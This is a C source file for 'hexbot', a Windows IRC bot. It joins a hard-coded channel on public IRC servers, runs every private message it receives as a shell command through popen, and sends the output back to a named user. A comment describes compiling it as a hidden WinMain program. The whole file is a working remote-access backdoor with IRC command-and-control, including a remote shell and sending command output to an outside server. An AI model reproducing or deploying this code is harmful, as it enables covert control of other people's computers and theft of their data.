/*[ hexbot IRC bot ][2013]
*
*	Written by Bashlykov Sergey aka hexfox
*
*   hexbot - Remote control of a Windows computer via IRC.
*   The IRC bot connects to the IRC server and enters
*   the channel. When another user sends a private message
*   to the bot, this message as a command is executed
*   on the remote computer where the bot started.
*
*/

#pragma comment(lib,"ws2_32.lib")
#include <WinSock2.h>
#include <stdio.h>
#include <conio.h>
#include <string.h>
#include <time.h>
#define popen _popen
#define pclose _pclose
#define SIZE_BUFFER 16384
#define SIZE_STR 128

SOCKET createSock(char * host_irc, unsigned short port_irc)
{
    SOCKET _socket;
    WSADATA wsa_data;
    struct hostent *host;
    struct sockaddr_in sock_addr;

    //initialise Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
    {
        printf("WSA Initialization failed!\n");
        WSACleanup();
        return 0;
    }

    //resolve IP address for hostname
    if ((host = gethostbyname(host_irc)) == NULL)
    {
        printf("Failed to resolve hostname!\n");
        WSACleanup();
        return 0;
    }

    //setup our socket address structure
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(port_irc);
    sock_addr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    if ((_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        printf("Socket creation failed!\n");
        WSACleanup();
        return 0;
    }

    //attempt to connect to server
    if (connect(_socket, (struct sockaddr*)(&sock_addr), sizeof(sock_addr)) != 0)
    {
        printf("Failed to establish connection with server!\n");
        WSACleanup();
        return 0;
    }

    return _socket;
}

void deleteSocket(SOCKET _socket)
{
    shutdown(_socket, SD_SEND);	//shutdown our socket
    closesocket(_socket);       //close our socket entirely
    WSACleanup();               //cleanup Winsock
}

//send user and nick to irc host
void sendUserNick(  SOCKET _socket,
                    char *nick,
                    char *bot_name,
                    char *prefix_name,
                    char *prefix_nick )
{
    char    name[SIZE_STR],
            tmp_1[SIZE_STR], tmp_2[SIZE_STR],
            tmp_3[SIZE_STR], tmp_4[SIZE_STR],
            tmp_5[SIZE_STR];

    char *msg_nick_name =
            (char *)malloc(strlen(prefix_name) + strlen(prefix_nick) + 128);
    srand((unsigned int)time(0));
    sprintf(msg_nick_name, "USER %s%d 0 * :%s\nNICK %s%d\n",
            prefix_name, rand(), bot_name, prefix_nick, rand());
    sscanf(msg_nick_name, "%s%s%s%s%s%s%s",
           tmp_1, name, tmp_2, tmp_3, tmp_4, tmp_5, nick);
    send(_socket, msg_nick_name, (int)strlen(msg_nick_name), 0);
    printf("%s", msg_nick_name);
    free(msg_nick_name);
}

 /*
//For invisible use "WINAPI WinMain"
int WINAPI WinMain(
                    HINSTANCE hInstance,        //handle to current instance
                    HINSTANCE hPrevInstance,	//handle to previous instance
                    LPSTR lpCmdLine,            //pointer to command line
                    int nCmdShow                //show state of window
                  )
*/


int main()
{
    //must be many servers if one not avialable

    char    //names
            *host_irc[] = { "chat.freenode.net",
                            "irc.757.org",
                            "irc.eth-0.nl"
                          },
            port_irc[]    = "6667",
            prefix_name[] = "zname",
            prefix_nick[] = "znick",
            bot_name[]    = "hexbot",
            *msg_nick_name,
            //commands
            *cmd,       //command from server
            *cmd_ping,  //ping to server
            cmd_join[] = "JOIN #h3xb0t\n",
            cmd_pong[] = "PONG ",
            cmd_part[] = "PART #h3xb0t\n",
            cmd_quit[] = "QUIT :bye\n",
            //buffers
            *sub_buff_from,
            buffer_from[SIZE_BUFFER], //msg from server
            buffer_to[SIZE_BUFFER],     //msg to server
            buffer_tmp[SIZE_BUFFER],
            //vars for parser msg from server
            usnd[SIZE_STR], snick[SIZE_STR],
            nick[SIZE_STR], srvcmd[SIZE_STR];

    int len_buff_from; //length buffer from server
    unsigned int i = 0,
                 stopped = 0,
                 count_hosts,
                 len_cmd_pong;
    FILE *io_buff;
    SOCKET _socket;

    count_hosts = sizeof(host_irc) / sizeof(host_irc[0]);
    len_cmd_pong = strlen(cmd_pong);

    memset(buffer_tmp, 0, sizeof(buffer_tmp));
    memset(buffer_from, 0, sizeof(buffer_from));

    while(1)
    {
        if (i == (count_hosts - 1))
            i = 0;
//TODO to function
        //connect to irc host
        if (!(_socket =
              createSock(host_irc[i], (unsigned short)atoi(port_irc))))
        {
            printf("Change server\n");
            deleteSocket(_socket);
            i++;
            continue;
        }
        printf("Connected to %s\n", host_irc[i]);
//TODO to function
        //send user and nick to irc host
        sendUserNick(   _socket,
                         nick,
                         bot_name,
                         prefix_name,
                         prefix_nick );
//TODO to function
        while((len_buff_from =
               recv(_socket, buffer_from, sizeof(buffer_from), 0)) != SOCKET_ERROR)
        {
            //parse for < userfrom@ip servercmd userto : >
            sscanf(buffer_from, "%s%s%s", usnd, srvcmd, snick);

            //join to channel
            if (strstr(buffer_from, "/MOTD") || strstr(buffer_from, "MODE"))
            {
                send(_socket, cmd_join, (int)strlen(cmd_join), 0);
                printf("%s", cmd_join);
            }
            //for reconnect
            if (strstr (buffer_from, "ERROR :Closing Link"))
            {
                i++;
                break;
            }
            //for stay on a server we play the game ping pong with server
            if(!strncmp ("PING", buffer_from, 4))
            {
                printf("%s", buffer_from);
                cmd_ping = (char *) malloc(strlen(buffer_from) + len_cmd_pong);
                sub_buff_from = strchr(buffer_from, ':');
                sprintf(cmd_ping, "%s%s", cmd_pong, sub_buff_from);
                printf("%s", cmd_ping);
                send(_socket, cmd_ping, (int)strlen(cmd_ping), 0);
                free (cmd_ping);
            }
            //if parsing cmd from server and nicks equally
            else if(!strcmp(srvcmd, "PRIVMSG") && !strcmp(snick, nick))
            {
                /*
                    read data after second char ':'
                    full string ->
                    [ userfrom@ip servercmd userto : {command param ...}
                     (this subsrtring is write to var - pcmd) ]
                */
                cmd = (char *)malloc(strlen(buffer_from));
                cmd = buffer_from;               
                while(cmd[1] != ':')
                {
                    cmd++;
                }
                cmd+=2;

                //reconnect server
                if (strstr(cmd, "!reconnect"))
                {
                    i++;
                    send(_socket, cmd_part, (int)strlen(cmd_part), 0);
                    send(_socket, cmd_quit, (int)strlen(cmd_quit), 0);
                    break;
                }

                if (strstr(cmd, "!stop"))//stopping bot
                {
                    stopped = 1;
                    break;
                }

                io_buff = popen(cmd, "rt");
                printf("%s", cmd);

                //send result of command
                while(fgets(buffer_tmp, sizeof(buffer_tmp), io_buff))
                {
                    strcpy(buffer_to, "PRIVMSG hexfox :");
                    strcat(buffer_to, buffer_tmp);
                    send(_socket, buffer_to, (int)strlen(buffer_to), 0);
                }

                memset(buffer_to, 0, sizeof(buffer_to));
                memset(buffer_tmp, 0, sizeof(buffer_tmp));
            }
            else
            {
                printf("%s", buffer_from);
            }

            len_buff_from = 0;
            memset(buffer_from, 0, sizeof(buffer_from));
        }

        //the end bot work
        if (stopped)
        {
            send(_socket, cmd_part, (int)strlen(cmd_part), 0);
            send(_socket, cmd_quit, (int)strlen(cmd_quit), 0);
            deleteSocket(_socket);
            printf("hexbot is stopped!\n");
            break;
        }
    }

    return 0;
}
